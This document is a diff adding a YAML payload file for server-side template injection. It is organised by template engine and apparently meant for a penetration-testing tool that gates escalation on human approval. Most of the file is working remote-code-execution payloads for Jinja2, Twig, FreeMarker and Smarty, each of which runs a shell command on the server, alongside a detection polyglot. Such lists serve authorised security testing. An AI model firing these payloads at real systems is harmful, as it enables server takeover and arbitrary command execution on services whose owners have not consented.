@@ -1,0 +1,40 @@
+name: SSTI Payloads
+description: Server-side template injection probes by engine
+
+detection_polyglot:
+  - "${7*7}{{7*7}}<%= 7*7 %>[[7*7]]${{7*7}}#{7*7}"
+
+jinja2:
+  detect:
+    - "{{7*7}}"
+    - "{{7*'7'}}"
+  rce:
+    - "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+    - "{{ config.items() }}"
+
+twig:
+  detect:
+    - "{{7*7}}"
+  rce:
+    - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+
+freemarker:
+  detect:
+    - "${7*7}"
+  rce:
+    - "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
+
+smarty:
+  detect:
+    - "{7*7}"
+  rce:
+    - "{php}echo `id`;{/php}"
+
+velocity:
+  detect:
+    - "#set($x=7*7)$x"
+
+notes: >
+  Always run the detection_polyglot probe first and only escalate to an
+  engine-specific RCE payload after a HIGH-risk exploit attempt is approved
+  by the human.
